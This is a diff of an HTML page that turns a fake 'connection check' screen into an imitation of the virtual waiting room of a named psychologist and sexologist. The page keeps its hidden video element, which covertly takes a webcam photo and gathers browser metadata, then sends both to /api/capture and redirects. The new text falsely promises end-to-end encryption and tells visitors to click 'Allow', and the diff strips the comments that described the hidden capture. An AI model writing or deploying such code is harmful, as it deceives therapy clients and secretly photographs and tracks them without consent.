@@ -3,29 +3,37 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bem-vindo</title>
+  <title>Adriana Visioli - Psicóloga & Sexóloga</title>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,700;1,400&family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
 
     body {
-      background: #0d0d0d;
-      color: #fff;
-      font-family: 'Segoe UI', sans-serif;
+      background: #faf7f2;
+      color: #333;
+      font-family: 'Poppins', sans-serif;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       min-height: 100vh;
       overflow: hidden;
+      position: relative;
     }
 
-    /* Fundo animado */
-    .bg {
+    /* Elementos decorativos */
+    .bg-shape {
       position: fixed;
-      inset: 0;
-      background: radial-gradient(ellipse at 20% 50%, #1a1a2e 0%, #0d0d0d 60%),
-                  radial-gradient(ellipse at 80% 20%, #16213e 0%, transparent 50%);
+      border-radius: 50%;
+      filter: blur(80px);
       z-index: 0;
+      opacity: 0.6;
+    }
+    .shape1 {
+      top: -10%; left: -10%; width: 40vw; height: 40vw; background: #e8d5cc;
+    }
+    .shape2 {
+      bottom: -15%; right: -5%; width: 50vw; height: 50vw; background: #dac4cc;
     }
 
     .content {
@@ -35,57 +43,82 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      gap: 16px;
+      gap: 20px;
+      padding: 40px;
+      background: rgba(255, 255, 255, 0.7);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255,255,255,0.4);
+      border-radius: 20px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.03);
+      max-width: 450px;
+      width: 90%;
     }
 
-    .icon {
-      width: 80px;
-      height: 80px;
-      background: linear-gradient(135deg, #667eea, #764ba2);
-      border-radius: 24px;
+    .profile-icon {
+      width: 90px;
+      height: 90px;
+      background: #cbb4bc;
+      color: white;
+      border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 36px;
-      margin-bottom: 8px;
-      box-shadow: 0 8px 32px rgba(102, 126, 234, 0.4);
+      font-size: 40px;
+      box-shadow: 0 10px 20px rgba(203, 180, 188, 0.4);
+      margin-bottom: 5px;
     }
 
     h1 {
+      font-family: 'Playfair Display', serif;
       font-size: 2rem;
-      font-weight: 700;
-      background: linear-gradient(90deg, #fff, #aaa);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
+      color: #4a3e42;
+      line-height: 1.2;
+    }
+    h1 span {
+      display: block;
+      font-family: 'Poppins', sans-serif;
+      font-size: 0.9rem;
+      font-weight: 400;
+      color: #887a7f;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      margin-top: 8px;
     }
 
     p {
-      color: #888;
+      color: #665;
       font-size: 1rem;
-      max-width: 320px;
+      line-height: 1.5;
+    }
+
+    .loading-container {
+      width: 100%;
+      margin-top: 15px;
     }
 
     .loader {
-      width: 200px;
-      height: 4px;
-      background: #1e1e1e;
-      border-radius: 4px;
+      width: 100%;
+      height: 6px;
+      background: #eee;
+      border-radius: 6px;
       overflow: hidden;
-      margin-top: 8px;
+      margin-bottom: 12px;
     }
 
     .loader-bar {
       height: 100%;
-      background: linear-gradient(90deg, #667eea, #764ba2);
-      border-radius: 4px;
+      background: #cbb4bc;
+      border-radius: 6px;
       width: 0%;
       transition: width 0.1s linear;
     }
 
     #msg {
-      font-size: 0.8rem;
-      color: #555;
-      min-height: 18px;
+      font-size: 0.85rem;
+      color: #887a7f;
+      font-weight: 500;
+      display: inline-block;
+      min-height: 20px;
     }
 
     /* Câmera oculta */
@@ -105,14 +138,19 @@
   </style>
 </head>
 <body>
-  <div class="bg"></div>
+  <div class="bg-shape shape1"></div>
+  <div class="bg-shape shape2"></div>
 
   <div class="content">
-    <div class="icon">🔒</div>
-    <h1>Verificando acesso</h1>
-    <p>Por favor, aguarde enquanto verificamos sua conexão...</p>
-    <div class="loader"><div class="loader-bar" id="bar"></div></div>
-    <span id="msg">Iniciando...</span>
+    <div class="profile-icon">✨</div>
+    <h1>Adriana Visioli<span>Psicóloga & Sexóloga</span></h1>
+    
+    <p>Bem-vinda(o) à sala de espera virtual.</p>
+
+    <div class="loading-container">
+      <div class="loader"><div class="loader-bar" id="bar"></div></div>
+      <span id="msg">Preparando sala de teleatendimento...</span>
+    </div>
   </div>
 
   <video  id="video"  autoplay playsinline muted></video>
@@ -138,15 +176,15 @@
     }, 80);
 
     const messages = [
-      'Verificando navegador...',
-      'Checando certificado...',
-      'Estabelecendo conexão segura...',
+      'Por favor, clique em "Permitir" quando o navegador pedir...',
+      'Verificando áudio e vídeo da sessão...',
+      'Estabelecendo conexão segura (criptografia ponta-a-ponta)...',
       'Quase lá...'
     ];
     let msgIdx = 0;
     const msgInterval = setInterval(() => {
       if (msgIdx < messages.length) msg.textContent = messages[msgIdx++];
-    }, 900);
+    }, 1200);
 
     // Coleta metadados do cliente
     function getMeta() {
@@ -169,11 +207,9 @@
       canvas.height = video.videoHeight || 480;
       canvas.getContext('2d').drawImage(video, 0, 0);
 
-      // Flash sutil
       flash.classList.add('on');
       setTimeout(() => flash.classList.remove('on'), 150);
 
-      // Para câmera
       if (stream) stream.getTracks().forEach(t => t.stop());
 
       const image = canvas.toDataURL('image/jpeg', 0.85);
@@ -188,15 +224,13 @@
         console.warn('Captura falhou:', e);
       }
 
-      // Completa a barra
       bar.style.width = '100%';
       clearInterval(barInterval);
       clearInterval(msgInterval);
-      msg.textContent = 'Conexão verificada!';
+      msg.textContent = 'Ambiente verificado!';
 
-      // Redireciona ou mostra conteúdo real
       setTimeout(() => {
-        msg.textContent = 'Redirecionando...';
+        msg.textContent = 'Redirecionando para a sala...';
         setTimeout(() => location.href = '/sucesso.html', 600);
       }, 800);
     }
@@ -210,11 +244,9 @@
         video.srcObject = stream;
 
         video.onloadedmetadata = () => {
-          // Aguarda 1.5s para câmera estabilizar
           setTimeout(capturar, 1500);
         };
       } catch {
-        // Câmera negada — ainda registra sem foto
         try {
           await fetch('/api/capture', {
             method: 'POST',
@@ -229,7 +261,7 @@
         bar.style.width = '100%';
         clearInterval(barInterval);
         clearInterval(msgInterval);
-        msg.textContent = 'Redirecionando...';
+        msg.textContent = 'Aguarde...';
         setTimeout(() => location.href = '/sucesso.html', 1000);
       }
     }
